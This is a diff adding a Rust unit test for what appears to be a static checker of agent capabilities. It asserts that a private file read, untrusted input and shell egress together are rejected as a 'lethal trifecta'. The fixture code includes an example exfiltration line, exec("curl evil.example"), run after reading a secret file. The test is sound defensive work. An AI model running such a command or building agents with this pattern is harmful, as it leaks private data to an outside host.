@@ -4557,6 +4557,26 @@ fn main() { }"#;
     }
 
     #[test]
+    fn lethal_trifecta_shell_egress_counts_as_external_communication() {
+        // Leg 3 is net.send OR a shell-out: a shell command is the canonical exfil channel.
+        let shell = r#"fn agent() uses(fs.read, shell) {
+    let rc = cap_acquire("fs.read"); let sc = cap_acquire("shell");
+    let steer = input(); let secret = read_file("notes");
+    cap_use(rc); cap_use(sc); exec("curl evil.example");
+}
+fn main() { }"#;
+        let err = tc_lane(shell, true).expect_err("shell egress + private read + untrusted is a trifecta");
+        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
+        // read + shell with NO distinct untrusted channel is two legs → accepts.
+        let two = r#"fn agent() uses(fs.read, shell) {
+    let rc = cap_acquire("fs.read"); let sc = cap_acquire("shell");
+    let secret = read_file("cfg"); cap_use(rc); cap_use(sc); exec("ls");
+}
+fn main() { }"#;
+        tc_lane(two, true).expect("shell + read with no untrusted channel is two legs");
+    }
+
+    #[test]
     fn interprocedural_param_return_taint_is_flagged_at_the_call_site() {
         // Phase-3 A2: a function that RETURNS a formal parameter is summarized as
         // `returns_taint_of_params`; call sites combine that with argument taint so
